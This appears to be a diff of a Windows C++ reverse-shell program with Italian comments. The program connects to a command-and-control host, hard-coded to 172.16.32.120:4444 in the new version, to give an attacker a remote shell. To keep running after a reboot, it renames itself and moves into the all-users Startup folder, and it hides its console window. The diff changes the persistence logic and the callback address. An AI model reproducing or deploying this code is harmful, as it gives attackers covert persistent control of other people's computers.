@@ -33,7 +33,7 @@ void RunShell(char* C2Server, int C2Port) {
         SOCKET mySocket;
         sockaddr_in addr;
         WSADATA version;
-        WSAStartup(MAKEWORD(2,2), &version);
+        WSAStartup(MAKEWORD(2,2), &version);//questo
         mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
         addr.sin_family = AF_INET;
    
@@ -98,32 +98,36 @@ string random(){
 }
 
 int main(int argc, char* argv[]){
-	if (IsElevated()){
-	    string percorso = argv[0], name ,new_name=random();
-	    const size_t last_slash_idx = percorso.find_last_of("\\/");
-	    //trovo il nome del file
-	    if (std::string::npos != last_slash_idx){
+	string percorso = argv[0], name ,new_name=random();
+	const size_t last_slash_idx = percorso.find_last_of("\\/");
+	const string hard_percorso = percorso;
+	//trovo il nome del file
+    if (std::string::npos != last_slash_idx){
 		name = percorso.erase(0, last_slash_idx + 1);
-	    }
+    }
+	string percorso_nome = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + name;
+	
+	if (hard_percorso == percorso_nome or IsElevated()){
+	    
 	    //take persistence
-	    if (percorso != "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"){
-		system(("move \"" + name + "\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"").c_str());
+	    if (hard_percorso != percorso_nome){
+	    	//rinomino il file
+	    	system(("rename " + name + " " + new_name).c_str());
+			system(("move \"" + new_name + "\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"").c_str());
 	    }
-	    //rinomino il file
-	    system(("rename " + name + " " + new_name).c_str());
 	    FreeConsole();
 	    if (argc == 3) {
-		int port  = atoi(argv[2]); 
-		RunShell(argv[1], port);
+			int port  = atoi(argv[2]); 
+			RunShell(argv[1], port);
 	    }else {
-		char host[] = "192.168.56.103";  // change this to your ip address
-		int port = 4444;                //change this to your open port
-		RunShell(host, port);
+			char host[] = "172.16.32.120";  // change this to your ip address
+			int port = 4444;                //change this to your open port
+			RunShell(host, port);
 	    }
 	} else {
 		string type_error = "Permission Error";
 		string error = "You Must use Administrative permisions to execute me!";
 		MessageBoxA(NULL, error.c_str(), type_error.c_str(), MB_ICONERROR);
 	}
-	    return 0;
+	return 0;
 }
